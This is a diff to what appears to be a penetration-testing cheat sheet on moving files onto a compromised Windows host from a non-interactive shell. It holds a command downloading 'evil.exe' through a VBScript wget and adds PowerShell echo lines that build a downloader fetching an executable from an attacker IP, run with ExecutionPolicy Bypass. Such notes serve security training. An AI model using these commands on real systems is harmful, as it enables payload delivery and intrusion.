@@ -89,4 +89,23 @@ echo ts.Close >> wget.vbs
 You then execute the script like this: 
 **cscript wget.vbs http://192.168.10.5/evil.exe evil.exe** 
 
-The script works great and is made by this guy: https://gist.github.com/sckalath/ec7af6a1786e3de6c309
+The script works great and I found it at the this guys gist: https://gist.github.com/sckalath/ec7af6a1786e3de6c309
+
+
+## Powershell
+
+This is how we can download a file using powershell. Remember since we only have a non-interactive shell we can not start powershell.exe, because our shell can't handle that. But it is okay we can still run scripts in powershell.
+
+```
+echo $storageDir = $pwd > wget.ps1
+echo $webclient = New-Object System.Net.WebClient >>wget.ps1
+echo $url = "http://192.168.1.101/file.exe" >>wget.ps1
+echo $file = "output-file.exe" >>wget.ps1
+echo $webclient.DownloadFile($url,$file) >>wget.ps1
+```
+
+Now we invoke it with this crazy syntax:
+```
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -
+NoProfile -File wget.ps1
+```
